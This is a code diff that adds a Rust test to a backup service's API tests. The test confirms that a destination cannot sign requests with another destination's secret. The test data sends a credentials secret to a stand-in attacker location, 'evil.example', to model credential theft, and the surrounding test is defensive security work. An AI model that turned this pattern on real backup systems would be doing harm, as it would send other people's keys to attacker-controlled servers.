@@ -3418,6 +3418,46 @@ pub(crate) mod tests {
         (status, v)
     }
 
+    #[tokio::test]
+    async fn a_destination_signs_with_its_own_secret_and_no_other() {
+        // 🔴 The backup pass decrypts the secret a destination names and signs requests
+        // to its location with it: an `operate` caller naming another secret would send
+        // another destination's key to a server of their choosing.
+        let st = Arc::new(State::in_memory().await.expect("state"));
+        let r = || router(shared_state(st.clone(), true));
+        let body = |secret: &str| {
+            format!(r#"{{"location": "s3:evil.example/b", "credentials_secret": "{secret}"}}"#)
+        };
+
+        let (status, v) = send(
+            r(),
+            "PUT",
+            "/api/backup/destinations/mine?apply=true",
+            &body("backup-dest-offsite"),
+        )
+        .await;
+        assert_eq!(
+            (status, &v["applied"]),
+            (StatusCode::OK, &false.into()),
+            "{v}"
+        );
+        assert!(v["blockers"][0]
+            .as_str()
+            .expect("a blocker")
+            .contains("backup-dest-mine"));
+        assert!(st.destinations().await.expect("read").is_empty());
+
+        let (_, v) = send(
+            r(),
+            "PUT",
+            "/api/backup/destinations/mine?apply=true",
+            &body("backup-dest-mine"),
+        )
+        .await;
+        assert_eq!(v["applied"], true, "{v}");
+        assert_eq!(st.destinations().await.expect("read").len(), 1);
+    }
+
     async fn post(r: Router, uri: &str, body: &str) -> (StatusCode, serde_json::Value) {
         send(r, "POST", uri, body).await
     }
